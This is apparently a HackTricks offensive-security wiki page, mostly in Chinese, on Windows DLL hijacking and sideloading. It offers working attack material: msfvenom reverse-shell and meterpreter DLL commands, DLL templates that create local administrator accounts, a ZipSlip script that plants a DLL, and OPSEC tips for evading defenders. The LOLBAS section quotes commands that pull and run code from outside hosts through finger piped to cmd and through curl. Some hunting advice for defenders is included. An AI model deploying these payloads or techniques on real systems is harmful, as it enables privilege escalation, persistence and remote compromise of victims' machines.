# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking 涉及诱导受信任的应用程序加载恶意 DLL。这个术语涵盖了多种手法，例如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于 code execution、实现 persistence，以及较少见的 privilege escalation。尽管这里重点是提权，但 hijacking 的方式在不同目标下是一致的。

### Common Techniques

DLL hijacking 可采用多种方法，每种方法的效果取决于应用程序的 DLL loading strategy：

1. **DLL Replacement**：用恶意 DLL 替换真实 DLL，也可以结合 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：把恶意 DLL 放到比合法 DLL 更靠前的搜索路径中，利用应用程序的搜索模式。
3. **Phantom DLL Hijacking**：为应用程序创建一个恶意 DLL，让它误以为这是一个需要但不存在的 DLL。
4. **DLL Redirection**：修改 `%PATH%` 或 `.exe.manifest` / `.exe.local` 之类的搜索参数，把应用程序导向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：把恶意 DLL 放在用户可控目录中，并与复制过来的应用程序一起放置，类似 Binary Proxy Execution techniques。


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading 不是让受信任的 **.NET Framework** 进程加载 attacker code 的唯一方式。若目标可执行文件是一个 **managed** 应用程序，CLR 还会查找一个以该可执行文件命名的 **application configuration file**（例如 `Setup.exe.config`）。该文件可以定义自定义的 **AppDomainManager**。如果 config 指向一个放在 EXE 旁边、由 attacker 控制的 assembly，CLR 会在应用程序正常 code path **之前** 加载它，并在受信任的进程中运行。

根据 Microsoft 的 .NET Framework configuration schema，要使用自定义 manager，`<appDomainManagerAssembly>` 和 `<appDomainManagerType>` 都必须存在。

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
实用说明：
- 这是 **.NET Framework specific** 的 tradecraft。它依赖 CLR 配置解析，而不是 Win32 DLL search order。
- 主机必须真的是一个 **managed EXE**。快速排查：`sigcheck -m target.exe`、`corflags target.exe`，或者在 PE metadata 中检查 **CLR Runtime Header**。
- config 文件名必须与可执行文件名完全一致（`<binary>.config`），并且通常位于 **EXE 旁边**。
- 这对 **signed Microsoft/vendor binaries** 很有用，因为受信任的 EXE 保持不变，而恶意的 managed assembly 会在进程内执行。
- 如果你已经有一个可写的 installer/update 目录，AppDomainManager hijacking 可以作为 **first stage**，然后在后续阶段再使用经典 DLL sideloading 或 reflective loading。

### Hijacking an existing scheduled task to relaunch the sideload chain

为了 persistence，不要只盯着 **creating a new task**。一些 intrusion sets 会等到合法安装程序创建一个 **normal updater task**，然后再 **rewrite the task action**，这样现有的名称、作者和 trigger 看起来仍然对 defenders 很熟悉。

Reusable workflow:
1. 安装/运行合法软件，并识别它通常创建的任务。
2. 导出任务 XML，记录当前的 `<Exec><Command>` / `<Arguments>` 值。
3. 只替换 action，让任务从一个用户可写的 staging directory 启动你的 **trusted host EXE**，然后它再 side-load 或 AppDomain-load 真正的 payload。
4. 重新注册同一个任务名，而不是创建一个新的、明显的 persistence artifact。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
为什么它更隐蔽：
- 任务名称看起来仍然合法（例如某个厂商更新程序）。
- **Task Scheduler service** 会启动它，所以父/祖先进程校验通常看到的是预期的调度链，而不是 `explorer.exe`。
- 只盯着 **新任务名称** 的 DFIR 团队，可能会漏掉这样一种任务：它的注册信息原本就存在，但 action 现在指向了 `%LOCALAPPDATA%`、`%APPDATA%`，或其他攻击者可控路径。

快速 hunting 方向：
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- 将 `C:\Windows\System32\Tasks\*` 的 XML 和 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` 元数据与基线进行比较。
- 当一个 **看起来像厂商更新器的任务** 从 **用户可写目录** 执行，或启动一个带有同目录 `*.config` 文件的 .NET EXE 时，告警。

> [!TIP]
> 关于一个分层使用 HTML staging、AES-CTR configs 和 .NET implants，并叠加在 DLL sideloading 之上的逐步链条，请查看下面的 workflow。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

在系统中寻找缺失的 Dlls，最常见的方法是从 sysinternals 运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，**设置**以下 **2 个过滤器**：

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

并且只显示 **File System Activity**：

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

如果你是在寻找 **一般的 missing dlls**，就让它运行 **几秒**。\
如果你是在寻找 **某个特定可执行文件中的 missing dll**，你应该再设置一个 **类似 "Process Name" "contains" `<exec name>` 的过滤器，执行它，然后停止捕获事件**。

## Exploiting Missing Dlls

为了提权，我们最好的机会是能够 **写入一个提权进程会尝试加载的 dll**，并且让它位于某个 **会被搜索到的位置**。因此，我们可以在一个 **文件夹** 中 **写入** 一个 dll，只要这个 **dll 会先于** 原始 dll 所在的文件夹被搜索到（特殊情况），或者我们可以 **写入** 某个会被搜索的文件夹，而原始 **dll** 在任何文件夹中都不存在。

### Dll Search Order

**在** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中你可以找到 Dll 是如何被具体加载的。**

**Windows applications** 会按照一组 **预定义的搜索路径** 来查找 DLL，并遵循特定顺序。当恶意 DLL 被策略性地放置在这些目录之一时，就会出现 DLL hijacking 问题，从而确保它在真正的 DLL 之前被加载。防止这一点的一个办法是让应用程序在引用它所需的 DLL 时使用绝对路径。

你可以在下面看到 **32-bit** 系统上的 **DLL search order**：

1. 应用程序加载的目录。
2. system directory。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取该目录路径。(_C:\Windows\System32_)
3. 16-bit system directory。没有函数可以获取该目录路径，但它会被搜索。(_C:\Windows\System_)
4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取该目录路径。
1. (_C:\Windows_)
5. 当前目录。
6. PATH 环境变量中列出的目录。注意，这不包括由 **App Paths** registry key 指定的每个应用程序路径。计算 DLL 搜索路径时不会使用 **App Paths** key。

这是在启用 **SafeDllSearchMode** 时的 **default** 搜索顺序。当它被禁用时，当前目录会提升到第二位。要禁用此特性，创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value 并将其设为 0（默认是启用的）。

如果 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用，搜索会从 **LoadLibraryEx** 正在加载的可执行模块所在目录开始。

最后，注意 **dll 也可能通过指定绝对路径而不是仅名称来加载**。在这种情况下，该 dll **只会在那个路径中被搜索**（如果 dll 有任何依赖项，它们会像刚刚通过名称加载一样被搜索）。

还有其他方法可以改变搜索顺序，但这里不展开说明。

### Chaining an arbitrary file write into a missing-DLL hijack

1. 使用 **ProcMon** 过滤器（`Process Name` = 目标 EXE，`Path` 以 `.dll` 结尾，`Result` = `NAME NOT FOUND`）来收集该进程尝试探测但找不到的 DLL 名称。
2. 如果二进制文件通过 **schedule/service** 运行，把其中一个这样的 DLL 放到 **application directory**（search-order 第 #1 项）里，它会在下一次执行时被加载。在一个 .NET scanner 案例中，该进程在从 `C:\Program Files\dotnet\fxr\...` 加载真正的副本之前，先在 `C:\samples\app\` 中查找 `hostfxr.dll`。
3. 构建一个 payload DLL（例如 reverse shell），并导出任意一个 export：`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. 如果你的原语是 **ZipSlip-style arbitrary write**，构造一个 ZIP，使其中的条目逃逸出解压目录，从而让 DLL 落到 app 文件夹中：
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 将归档文件投递到被监控的 inbox/share；当计划任务重新拉起进程时，它会加载恶意 DLL，并以 service account 执行你的代码。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种更高级、可确定性地影响新建进程 DLL search path 的方法，是在使用 ntdll 的 native APIs 创建进程时，设置 RTL_USER_PROCESS_PARAMETERS 里的 DllPath 字段。通过在这里提供一个由攻击者控制的目录，可以强制目标进程从该目录加载一个按名称解析的 imported DLL（不是绝对路径，且没有使用 safe loading 标志），从而加载恶意 DLL。

Key idea
- 使用 RtlCreateProcessParametersEx 构造 process parameters，并提供一个自定义的 DllPath，指向你控制的文件夹（例如，dropper/unpacker 所在的目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标 binary 按名称解析某个 DLL 时，loader 会在解析过程中查询这个提供的 DllPath，即使 malicious DLL 不与目标 EXE 同目录，也能实现可靠的 sideloading。

Notes/limitations
- 这影响的是正在创建的 child process；它不同于 SetDllDirectory，后者只影响当前 process。
- 目标必须按名称 import 或 LoadLibrary 一个 DLL（不是绝对路径，且没有使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径不能被 hijack。forwarded exports 和 SxS 可能会改变优先级。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- 将一个恶意的 xmllite.dll（导出所需函数，或代理到真实的 DLL）放到你的 DllPath 目录中。
- 使用上述技术启动一个已知会按名称查找 xmllite.dll 的签名 binary。loader 会通过提供的 DllPath 解析 import，并 sideload 你的 DLL。

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- 当遇到一个**与内存中已加载的 DLL 同名的 DLL**时，system 会绕过常规搜索。Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并 **检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你还可以用以下方式检查一个可执行文件的 imports 和一个 dll 的 exports:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86，我没有看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

请注意，在某些情况下，你编译的 Dll 必须 **export several functions**，这些函数将由受害进程加载；如果这些函数不存在，**binary won't be able to load** 它们，**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>带有用户创建的 C++ DLL 示例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的替代 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 仍会在启动时探测一个可预测、与语言相关的 localization DLL，该 DLL 可被 hijack 用于任意代码执行和持久化。

关键事实
- 探测路径（当前版本）：`%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 旧路径（较早版本）：`%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- 如果在 OneCore 路径下存在一个可写的、受 attacker 控制的 DLL，它就会被加载并执行 `DllMain(DLL_PROCESS_ATTACH)`。不需要 exports。

使用 Procmon 发现
- 过滤器：`Process Name is Narrator.exe` 和 `Operation is Load Image` 或 `CreateFile`.
- 启动 Narrator，并观察对上述路径的加载尝试。

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 一个 naive hijack 会 speak/highlight UI。为了保持 quiet，在 attach 时枚举 Narrator threads，打开主线程 (`OpenThread(THREAD_SUSPEND_RESUME)`) 并 `SuspendThread` 它；然后在你自己的线程里继续。完整代码见 PoC。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 使用以上设置后，启动 Narrator 会加载 planted DLL。在 secure desktop（logon screen）上按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 执行。

RDP-triggered SYSTEM execution (lateral movement)
- 允许 classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 通过 RDP 连接到主机，在 logon screen 按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 执行。
- RDP session 关闭时执行会停止——请尽快 inject/migrate。

Bring Your Own Accessibility (BYOA)
- 你可以 clone 一个内置的 Accessibility Tool (AT) registry entry（例如 CursorIndicator），把它编辑为指向任意 binary/DLL，导入后再将 `configuration` 设为该 AT 名称。这样就能通过 Accessibility framework 代理任意执行。

Notes
- 在 `%windir%\System32` 下写入以及修改 HKLM values 需要 admin rights。
- 所有 payload 逻辑都可以放在 `DLL_PROCESS_ATTACH` 中；不需要 exports。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

这个案例演示了 Lenovo 的 TrackPoint Quick Menu (`TPQMAssistant.exe`) 中的 **Phantom DLL Hijacking**，被追踪为 **CVE-2025-1729**。

### Vulnerability Details

- **Component**: 位于 `C:\ProgramData\Lenovo\TPQM\Assistant\` 的 `TPQMAssistant.exe`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天 9:30 AM 以已登录用户的上下文运行。
- **Directory Permissions**: 由 `CREATOR OWNER` 可写，允许本地用户放置任意文件。
- **DLL Search Behavior**: 会优先尝试从其 working directory 加载 `hostfxr.dll`，如果缺失则记录 "NAME NOT FOUND"，说明本地目录搜索优先级更高。

### Exploit Implementation

攻击者可以在同一目录中放置一个恶意的 `hostfxr.dll` stub，利用缺失的 DLL 以已登录用户的上下文实现 code execution：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 作为标准用户，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待 scheduled task 在上午 9:30 以当前用户上下文运行。
3. 如果任务执行时有 administrator 已登录，恶意 DLL 会在 administrator 的 session 中以 medium integrity 运行。
4. 组合标准 UAC bypass techniques，将权限从 medium integrity 提升到 SYSTEM privileges。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors 经常将基于 MSI 的 droppers 与 DLL side-loading 结合使用，以在受信任的 signed process 下执行 payload。

Chain overview
- 用户下载 MSI。GUI 安装期间，一个 CustomAction 静默运行（例如 LaunchApplication 或 VBScript action），从嵌入式资源中重建下一阶段。
- dropper 将一个合法、signed 的 EXE 和一个恶意 DLL 写入同一目录（示例组合：Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 当启动这个 signed EXE 时，Windows DLL search order 会优先从 working directory 加载 wsc.dll，从而在 signed parent 下执行 attacker code（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 查找运行 executables 或 VBScript 的条目。可疑模式示例：LaunchApplication 在后台执行一个嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary tables。
- MSI CAB 中的嵌入式/拆分 payload:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- 或使用 lessmsi: lessmsi x package.msi C:\out
- 查找多个小碎片，它们会被 VBScript CustomAction 拼接并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 将这两个文件放在同一个文件夹中：
- wsc_proxy.exe：合法签名的 host（Avast）。该进程会尝试按名称从其目录加载 wsc.dll。
- wsc.dll：攻击者 DLL。如果不需要特定 exports，DllMain 就足够；否则，构建一个 proxy DLL，并将所需 exports 转发到真正的库，同时在 DllMain 中运行 payload。
- 构建一个最小化的 DLL payload：
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于 export requirements，使用 proxying framework（例如 DLLirant/Spartacus）生成一个 forwarding DLL，同时执行你的 payload。

- 这种技术依赖于 host binary 的 DLL name resolution。如果 host 使用 absolute paths 或 safe loading flags（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），hijack 可能会失败。
- KnownDLLs、SxS 和 forwarded exports 会影响 precedence，在选择 host binary 和 export set 时必须考虑这些因素。

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point 描述了 Ink Dragon 如何通过一个 **three-file triad** 部署 ShadowPad，在磁盘上保持 core payload 加密的同时伪装成合法软件：

1. **Signed host EXE** – 伪造并滥用 AMD、Realtek 或 NVIDIA 等厂商文件（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者会把可执行文件重命名成看起来像 Windows binary 的名字（例如 `conhost.exe`），但 Authenticode signature 仍然有效。
2. **Malicious loader DLL** – 与 EXE 放在一起，使用预期名称（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是一个被 ScatterBrain framework 混淆的 MFC binary；它唯一的任务是定位 encrypted blob、解密它，并 reflectively map ShadowPad。
3. **Encrypted payload blob** – 通常以 `<name>.tmp` 的形式存放在同一目录中。内存映射解密后的 payload 之后，loader 会删除 TMP 文件以销毁 forensic evidence。

Tradecraft notes:

* 重命名 signed EXE（同时保留 PE header 中原始的 `OriginalFileName`）可以让它伪装成 Windows binary，同时保留厂商签名，因此可以复现 Ink Dragon 那种投放看起来像 `conhost.exe`、实则是 AMD/NVIDIA 工具的做法。
* 由于 executable 仍然是 trusted 的，大多数 allowlisting 控制只需要你的 malicious DLL 与它并排放置即可。重点应放在定制 loader DLL 上；signed parent 通常可以原样运行。
* ShadowPad 的 decryptor 期望 TMP blob 位于 loader 旁边，并且是可写的，这样它才能在映射后把文件清零。应保持目录可写直到 payload 加载完成；一旦进入内存，TMP 文件就可以安全删除以满足 OPSEC。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

攻击者会把 DLL sideloading 与 LOLBAS 配合使用，这样磁盘上唯一的自定义文件就是位于 trusted EXE 旁边的 malicious DLL：

- **Remote command loader (Finger):** Hidden PowerShell 启动 `cmd.exe /c`，从 Finger server 拉取命令并管道给 `cmd`：

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` 拉取 TCP/79 text；`| cmd` 执行 server response，使攻击者能够在服务端轮换 second stage server。

- **Built-in download/extract:** 下载一个带 benign extension 的 archive，解包，然后在随机的 `%LocalAppData%` 文件夹下部署 sideload target 和 DLL：

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` 会隐藏进度并跟随 redirects；`tar -xf` 使用 Windows 内置的 tar。

- **WMI/CIM launch:** 通过 WMI 启动 EXE，这样 telemetry 会显示一个由 CIM 创建的 process，同时它会加载同目录的 DLL：

